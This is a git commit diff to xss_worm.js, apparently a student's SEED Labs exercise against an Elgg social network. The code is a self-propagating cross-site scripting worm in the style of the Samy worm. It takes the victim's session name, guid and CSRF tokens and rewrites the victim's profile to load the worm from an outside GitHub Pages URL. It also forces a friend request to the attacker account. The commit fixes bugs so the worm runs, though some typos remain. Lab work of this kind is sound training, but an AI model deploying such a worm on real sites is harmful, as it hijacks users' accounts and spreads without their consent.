8eda14d62693aceadbf90ea1b6899465c21823dc
z-summer-zhw <76779464+z-summer-zhw@users.noreply.github.com>
2024-09-19 12:25:09 +0800

    Update xss_worm.js

--- xss_worm.js
+++ xss_worm.js
@@ -4,18 +4,20 @@ var Ajax = null;
 var Ajax2 = null;
 var userName ="&name="+ elgg.session.user.name;
 var guid="&guid="+ elgg.session.user.guid;
-var ts=“& elgg ts="+ elgg.security.token. elgg ts;
-var token ="& elgg token="+ elgg.security.token._elgg_token;
-var content = userame + guid + token + ts + "&description= <script type= "text/javascript\" src=\"https://z-summer-zhw.github.io/lab1/xss_worm.js\"></script>";
+var ts=“&__elgg_ts="+ elgg.security.token.__elgg_ts;
+var token ="&__elgg_token="+ elgg.security.token.__elgg_token;
+var content = userName + guid + token + ts + "&description= <script type= \"text/javascript\" src=\"https://z-summer-zhw.github.io/lab1/xss_worm.js\"></script>";
 var samyGuid =59;
 var profileEditUrl="http://www.seed-server.com/action/profile/edit";
 var addfriendUrl = "http://www.seed-server.com/action/friends/add?friend=59"+ ts + token;
 if(elgg.session.user.guid != samyGuid){
 Ajax = new XMLHttpRequest();
-Ajax.open("PosT",profileEditUrl,true);
+Ajax.open("POST",profileEditUrl,true);
 Ajax.setRequestHeader("Content-Type",“application/x-www-form-urlencoded");
 Ajax.send(content);
 Ajax2 = new XMLHttpRequest();
 Ajax2.open("GET",addFriendUrl,true);
 Ajax2.send();
+}
+}
 </script>
